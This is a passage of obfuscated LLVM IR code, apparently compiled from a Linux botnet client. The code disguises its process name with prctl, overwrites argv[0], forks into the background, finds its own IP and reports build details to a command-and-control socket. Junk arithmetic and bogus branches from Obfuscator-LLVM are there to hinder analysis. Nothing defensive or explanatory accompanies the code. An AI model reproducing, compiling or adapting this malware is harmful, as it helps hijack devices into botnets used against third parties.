  %686 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.491, i32 0, i32 0), i8* %683, i8* %685)
  %687 = load i8**, i8*** %663, align 8
  %688 = getelementptr inbounds i8*, i8** %687, i64 0
  %689 = load i8*, i8** %688, align 8
  %690 = load i8**, i8*** %663, align 8
  %691 = getelementptr inbounds i8*, i8** %690, i64 0
  %692 = load i8*, i8** %691, align 8
  %693 = call i64 @strlen(i8* %692) #10
  %694 = call i8* @strncpy(i8* %689, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.490, i32 0, i32 0), i64 %693) #5
  %695 = load i8**, i8*** %663, align 8
  %696 = getelementptr inbounds i8*, i8** %695, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.490, i32 0, i32 0), i8** %696, align 8
  %697 = load i8*, i8** %664, align 8
  %698 = ptrtoint i8* %697 to i64
  %699 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %698, i32 0, i32 0, i32 0)
  %700 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %701 = call i32 @getpid() #5
  %_ = sub i32 0, %700
  %gen = add i32 %_, %701
  %_1 = shl i32 %700, %701
  %702 = xor i32 %700, %701
  call void @srand(i32 %702) #5
  %703 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %704 = call i32 @getpid() #5
  %_2 = sub i32 0, %703
  %gen3 = add i32 %_2, %704
  %_4 = sub i32 0, %703
  %gen5 = add i32 %_4, %704
  %_6 = sub i32 %703, %704
  %gen7 = mul i32 %_6, %704
  %_8 = sub i32 0, %703
  %gen9 = add i32 %_8, %704
  %_10 = sub i32 %703, %704
  %gen11 = mul i32 %_10, %704
  %_12 = shl i32 %703, %704
  %705 = xor i32 %703, %704
  call void @init_rand(i32 %705)
  %706 = call i32 @getOurIP()
  %707 = call i32 @fork() #5
  store i32 %707, i32* %665, align 4
  %708 = icmp ne i32 %707, 0
  br label %originalBB

originalBB13alteredBB:                            ; preds = %originalBB13, %67
  %709 = load i32, i32* %15, align 4
  %710 = call i32 @waitpid(i32 %709, i32* %17, i32 0)
  call void @exit(i32 0) #14
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %86
  %711 = load i32, i32* %15, align 4
  %712 = icmp ne i32 %711, 0
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %127
  %713 = load i32, i32* @mainCommSock, align 4
  %714 = call i8* @getBuild()
  %715 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %716 = call i8* @inet_ntoa(i32 %715) #5
  %717 = call i32 (i32, i8*, ...) @sockprintf(i32 %713, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.493, i32 0, i32 0), i8* %714, i8* %716)
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %155
  %718 = load i32, i32* %20, align 4
  %719 = sext i32 %718 to i64
  %720 = load i64, i64* @numpids, align 8
  %721 = icmp ult i64 %719, %720
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %184
  %722 = load i32, i32* %20, align 4
  %_30 = shl i32 %722, 1
  %_31 = sub i32 %722, 1
  %gen32 = mul i32 %_31, 1
  %_33 = shl i32 %722, 1
  %723 = add nsw i32 %722, 1
  store i32 %723, i32* %22, align 4
  br label %originalBB29

originalBB37alteredBB:                            ; preds = %originalBB37, %222
  %724 = load i32*, i32** @pids, align 8
  %725 = load i32, i32* %22, align 4
  %_38 = shl i32 %725, 1
  %_39 = sub i32 0, %725
  %gen40 = add i32 %_39, 1
  %_41 = sub i32 0, %725
  %gen42 = add i32 %_41, 1
  %_43 = sub i32 %725, 1
  %gen44 = mul i32 %_43, 1
  %_45 = sub i32 %725, 1
  %gen46 = mul i32 %_45, 1
  %726 = sub i32 %725, 1
  %727 = zext i32 %726 to i64
  %728 = getelementptr inbounds i32, i32* %724, i64 %727
  store i32 0, i32* %728, align 4
  %729 = load i64, i64* @numpids, align 8
  %_47 = shl i64 %729, -1
  %_48 = sub i64 %729, -1
  %gen49 = mul i64 %_48, -1
  %_50 = shl i64 %729, -1
  %730 = add i64 %729, -1
  store i64 %730, i64* @numpids, align 8
  %731 = load i64, i64* @numpids, align 8
  %_51 = sub i64 0, %731
  %gen52 = add i64 %_51, 1
  %_53 = shl i64 %731, 1
  %_54 = sub i64 %731, 1
  %gen55 = mul i64 %_54, 1
  %_56 = sub i64 %731, 1
  %gen57 = mul i64 %_56, 1
  %_58 = sub i64 %731, 1
  %gen59 = mul i64 %_58, 1
  %_60 = shl i64 %731, 1
  %732 = add i64 %731, 1
  %_61 = sub i64 %732, 4
  %gen62 = mul i64 %_61, 4
  %_63 = shl i64 %732, 4
  %_64 = sub i64 %732, 4
  %gen65 = mul i64 %_64, 4
  %_66 = sub i64 0, %732
  %gen67 = add i64 %_66, 4
  %_68 = shl i64 %732, 4
  %_69 = sub i64 0, %732
  %gen70 = add i64 %_69, 4
  %_71 = shl i64 %732, 4
  %733 = mul i64 %732, 4
  %734 = call noalias i8* @malloc(i64 %733) #5
  %735 = bitcast i8* %734 to i32*
  store i32* %735, i32** %21, align 8
  store i32 0, i32* %22, align 4
  br label %originalBB37

originalBB75alteredBB:                            ; preds = %originalBB75, %266
  %736 = load i32, i32* %22, align 4
  %_76 = sub i32 %736, 1
  %gen77 = mul i32 %_76, 1
  %_78 = sub i32 0, %736
  %gen79 = add i32 %_78, 1
  %_80 = sub i32 %736, 1
  %gen81 = mul i32 %_80, 1
  %_82 = sub i32 %736, 1
  %gen83 = mul i32 %_82, 1
  %_84 = shl i32 %736, 1
  %_85 = shl i32 %736, 1
  %_86 = sub i32 0, %736
  %gen87 = add i32 %_86, 1
  %737 = add i32 %736, 1
  store i32 %737, i32* %22, align 4
  br label %originalBB75

originalBB91alteredBB:                            ; preds = %originalBB91, %285
  %738 = load i32*, i32** @pids, align 8
  %739 = bitcast i32* %738 to i8*
  call void @free(i8* %739) #5
  %740 = load i32*, i32** %21, align 8
  store i32* %740, i32** @pids, align 8
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %305
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %357
  %741 = load i8*, i8** %24, align 8
  %742 = load i8, i8* %741, align 1
  %743 = zext i8 %742 to i32
  %744 = icmp ne i32 %743, 0
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %383
  %745 = load i8*, i8** %24, align 8
  %746 = load i8, i8* %745, align 1
  %747 = zext i8 %746 to i32
  %748 = icmp eq i32 %747, 0
  br label %originalBB103

originalBB107alteredBB:                           ; preds = %originalBB107, %405
  %749 = load i8*, i8** %24, align 8
  store i8 0, i8* %749, align 1
  %750 = load i8*, i8** %23, align 8
  %751 = getelementptr inbounds i8, i8* %750, i64 1
  store i8* %751, i8** %24, align 8
  %752 = load i8*, i8** %23, align 8
  %753 = load i8*, i8** %24, align 8
  %754 = call i64 @strlen(i8* %753) #10
  %755 = getelementptr inbounds i8, i8* %752, i64 %754
  %756 = getelementptr inbounds i8, i8* %755, i64 2
  store i8* %756, i8** %23, align 8
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %458
  %757 = load i8*, i8** %23, align 8
  %758 = load i8, i8* %757, align 1
  %759 = zext i8 %758 to i32
  %760 = icmp ne i32 %759, 32
  br label %originalBB111

originalBB115alteredBB:                           ; preds = %originalBB115, %486
  %761 = load i8*, i8** %23, align 8
  %762 = getelementptr inbounds i8, i8* %761, i32 1
  store i8* %762, i8** %23, align 8
  br label %originalBB115

originalBB119alteredBB:                           ; preds = %originalBB119, %514
  %763 = load i8*, i8** %26, align 8
  %764 = load i8, i8* %763, align 1
  %765 = zext i8 %764 to i32
  %766 = call i32 @toupper(i32 %765) #10
  %767 = trunc i32 %766 to i8
  %768 = load i8*, i8** %26, align 8
  store i8 %767, i8* %768, align 1
  %769 = load i8*, i8** %26, align 8
  %770 = getelementptr inbounds i8, i8* %769, i32 1
  store i8* %770, i8** %26, align 8
  br label %originalBB119

originalBB123alteredBB:                           ; preds = %originalBB123, %579
  %771 = load i8*, i8** %31, align 8
  %772 = call i64 @strlen(i8* %771) #10
  %_124 = sub i64 %772, 1
  %gen125 = mul i64 %_124, 1
  %_126 = shl i64 %772, 1
  %_127 = sub i64 0, %772
  %gen128 = add i64 %_127, 1
  %773 = add i64 %772, 1
  %774 = call noalias i8* @malloc(i64 %773) #5
  %775 = load i32, i32* %30, align 4
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %776
  store i8* %774, i8** %777, align 8
  %778 = load i32, i32* %30, align 4
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %779
  %781 = load i8*, i8** %780, align 8
  %782 = load i8*, i8** %31, align 8
  %783 = call i64 @strlen(i8* %782) #10
  %_129 = sub i64 0, %783
  %gen130 = add i64 %_129, 1
  %_131 = sub i64 0, %783
  %gen132 = add i64 %_131, 1
  %_133 = sub i64 0, %783
  %gen134 = add i64 %_133, 1
  %_135 = sub i64 %783, 1
  %gen136 = mul i64 %_135, 1
  %_137 = sub i64 %783, 1
  %gen138 = mul i64 %_137, 1
  %784 = add i64 %783, 1
  call void @llvm.memset.p0i8.i64(i8* %781, i8 0, i64 %784, i32 1, i1 false)
  %785 = load i32, i32* %30, align 4
  %786 = sext i32 %785 to i64
  %787 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %786
  %788 = load i8*, i8** %787, align 8
  %789 = load i8*, i8** %31, align 8
  %790 = call i8* @strcpy(i8* %788, i8* %789) #5
  %791 = load i32, i32* %30, align 4
  %_139 = sub i32 0, %791
  %gen140 = add i32 %_139, 1
  %_141 = sub i32 0, %791
  %gen142 = add i32 %_141, 1
  %_143 = sub i32 %791, 1
  %gen144 = mul i32 %_143, 1
  %_145 = shl i32 %791, 1
  %_146 = sub i32 %791, 1
  %gen147 = mul i32 %_146, 1
  %_148 = sub i32 %791, 1
  %gen149 = mul i32 %_148, 1
  %792 = add nsw i32 %791, 1
  store i32 %792, i32* %30, align 4
  br label %originalBB123

originalBB153alteredBB:                           ; preds = %originalBB153, %640
  br label %originalBB153
}

declare i32 @printf(i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #2

declare i32 @prctl(...) #4

; Function Attrs: nounwind
declare i32 @setsid() #2

; Function Attrs: nounwind
declare i32 @chdir(i8*) #2

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #2

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146594516}
!2 = !{i32 -2146593825}
!3 = !{i32 -2146593131}
!4 = !{i32 -2146592376}
!5 = !{i32 -2146591549}
!6 = !{i32 -2146590728}
!7 = !{i32 -2146589713}
